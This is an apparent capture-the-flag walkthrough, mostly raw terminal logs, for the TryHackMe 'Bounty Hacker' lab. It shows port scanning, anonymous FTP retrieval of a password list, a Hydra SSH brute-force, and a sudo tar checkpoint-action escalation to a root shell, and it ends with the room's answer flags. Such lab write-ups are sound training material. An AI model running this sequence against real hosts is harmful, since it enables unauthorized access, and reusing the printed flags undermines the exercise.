https://tryhackme.com/room/cowboyhacker

BoxIP: 10.10.85.238

    ┌──(root💀kali)-[/home/kali/bounty]
    └─# rustscan --ulimit 5000 -b 2500 -a 10.10.85.238 -- -A
    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : https://discord.gg/GFrQsGy           :
    : https://github.com/RustScan/RustScan :
     --------------------------------------
    Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

    [~] The config file is expected to be at "/root/.rustscan.toml"
    [~] Automatically increasing ulimit value to 5000.
    Open 10.10.85.238:21
    Open 10.10.85.238:22
    Open 10.10.85.238:80
    [~] Starting Script(s)
    [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

    [~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-24 13:52 EDT
    NSE: Loaded 155 scripts for scanning.
    NSE: Script Pre-scanning.
    NSE: Starting runlevel 1 (of 3) scan.
    Initiating NSE at 13:52
    Completed NSE at 13:52, 0.00s elapsed
    NSE: Starting runlevel 2 (of 3) scan.
    Initiating NSE at 13:52
    Completed NSE at 13:52, 0.00s elapsed
    NSE: Starting runlevel 3 (of 3) scan.
    Initiating NSE at 13:52
    Completed NSE at 13:52, 0.00s elapsed
    Initiating Ping Scan at 13:52
    Scanning 10.10.85.238 [4 ports]
    Completed Ping Scan at 13:52, 0.15s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 13:52
    Completed Parallel DNS resolution of 1 host. at 13:52, 0.01s elapsed
    DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
    Initiating SYN Stealth Scan at 13:52
    Scanning 10.10.85.238 [3 ports]
    Discovered open port 21/tcp on 10.10.85.238
    Discovered open port 22/tcp on 10.10.85.238
    Discovered open port 80/tcp on 10.10.85.238
    Completed SYN Stealth Scan at 13:52, 0.15s elapsed (3 total ports)
    Initiating Service scan at 13:52
    Scanning 3 services on 10.10.85.238
    Completed Service scan at 13:52, 6.31s elapsed (3 services on 1 host)
    Initiating OS detection (try #1) against 10.10.85.238
    Retrying OS detection (try #2) against 10.10.85.238
    Initiating Traceroute at 13:52
    Completed Traceroute at 13:52, 0.15s elapsed
    Initiating Parallel DNS resolution of 2 hosts. at 13:52
    Completed Parallel DNS resolution of 2 hosts. at 13:52, 0.02s elapsed
    DNS resolution of 2 IPs took 0.02s. Mode: Async [#: 3, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
    NSE: Script scanning 10.10.85.238.
    NSE: Starting runlevel 1 (of 3) scan.
    Initiating NSE at 13:52
    NSE: [ftp-bounce 10.10.85.238:21] PORT response: 500 Illegal PORT command.
    NSE Timing: About 99.76% done; ETC: 13:53 (0:00:00 remaining)
    Completed NSE at 13:53, 30.73s elapsed
    NSE: Starting runlevel 2 (of 3) scan.
    Initiating NSE at 13:53
    Completed NSE at 13:53, 0.89s elapsed
    NSE: Starting runlevel 3 (of 3) scan.
    Initiating NSE at 13:53
    Completed NSE at 13:53, 0.00s elapsed
    Nmap scan report for 10.10.85.238
    Host is up, received echo-reply ttl 63 (0.12s latency).
    Scanned at 2022-08-24 13:52:46 EDT for 43s

    PORT   STATE SERVICE REASON         VERSION
    21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: TIMEOUT
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.9.2.110
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 1
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
    |   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
    |   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))



    ┌──(root💀kali)-[/home/kali/bounty]
    └─# ftp 10.10.85.238
    Connected to 10.10.85.238.
    220 (vsFTPd 3.0.3)
    Name (10.10.85.238:kali): anonymous
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> 
    ftp> ls -la 
    229 Entering Extended Passive Mode (|||51503|)
    ^C
    receive aborted. Waiting for remote to finish abort.
    ftp> passive
    Passive mode: off; fallback to active mode: off.
    ftp> ls -la
    200 EPRT command successful. Consider using EPSV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
    drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
    -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
    -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
    226 Directory send OK.
    ftp> get locks.txt
    local: locks.txt remote: locks.txt
    200 EPRT command successful. Consider using EPSV.
    150 Opening BINARY mode data connection for locks.txt (418 bytes).
    100% |***********************************************************************************************************************************************************************|   418        7.03 KiB/s    00:00 ETA
    226 Transfer complete.
    418 bytes received in 00:00 (2.20 KiB/s)
    ftp> get task.txt
    local: task.txt remote: task.txt
    200 EPRT command successful. Consider using EPSV.
    150 Opening BINARY mode data connection for task.txt (68 bytes).
    100% |***********************************************************************************************************************************************************************|    68       58.45 KiB/s    00:00 ETA
    226 Transfer complete.
    68 bytes received in 00:00 (0.33 KiB/s)
    ftp> exit
    221 Goodbye.


    ┌──(root💀kali)-[/home/kali/bounty]
    └─# cat locks.txt 
    rEddrAGON
    ReDdr4g0nSynd!cat3
    Dr@gOn$yn9icat3
    R3DDr46ONSYndIC@Te
    ReddRA60N
    R3dDrag0nSynd1c4te
    dRa6oN5YNDiCATE
    ReDDR4g0n5ynDIc4te
    R3Dr4gOn2044
    RedDr4gonSynd1cat3
    R3dDRaG0Nsynd1c@T3
    Synd1c4teDr@g0n
    reddRAg0N
    REddRaG0N5yNdIc47e
    Dra6oN$yndIC@t3
    4L1mi6H71StHeB357
    rEDdragOn$ynd1c473
    DrAgoN5ynD1cATE
    ReDdrag0n$ynd1cate
    Dr@gOn$yND1C4Te
    RedDr@gonSyn9ic47e
    REd$yNdIc47e
    dr@goN5YNd1c@73
    rEDdrAGOnSyNDiCat3
    r3ddr@g0N
    ReDSynd1ca7e

    ┌──(root💀kali)-[/home/kali/bounty]
    └─# cat task.txt  
    1.) Protect Vicious.
    2.) Plan for Red Eye pickup on the moon.

    -lin


        ┌──(root💀kali)-[/home/kali/bounty]
        └─# hydra -l lin -P locks.txt 10.10.85.238 ssh                                 
        Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-24 13:59:48
        [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
        [DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
        [DATA] attacking ssh://10.10.85.238:22/
        [22][ssh] host: 10.10.85.238   login: lin   password: RedDr4gonSynd1cat3


        lin@bountyhacker:~/Desktop$ ls
        user.txt
        lin@bountyhacker:~/Desktop$ cat user.txt
        THM{CR1M3_SyNd1C4T3}

        lin@bountyhacker:~/Desktop$ sudo -l
        [sudo] password for lin: 
        Matching Defaults entries for lin on bountyhacker:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

        User lin may run the following commands on bountyhacker:
            (root) /bin/tar


        lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
        tar: Removing leading `/' from member names
        # whoami
        root
        # cd /root
        # ls -la
        total 40
        drwx------  5 root root 4096 Jun  7  2020 .
        drwxr-xr-x 24 root root 4096 Jun  6  2020 ..
        -rw-------  1 root root 2694 Jun  7  2020 .bash_history
        -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
        drwx------  2 root root 4096 Feb 26  2019 .cache
        drwxr-xr-x  2 root root 4096 Jun  7  2020 .nano
        -rw-r--r--  1 root root  148 Aug 17  2015 .profile
        -rw-r--r--  1 root root   19 Jun  7  2020 root.txt
        -rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
        drwx------  2 root root 4096 Jun  7  2020 .ssh
        # cat root.txt
        THM{80UN7Y_h4cK3r}















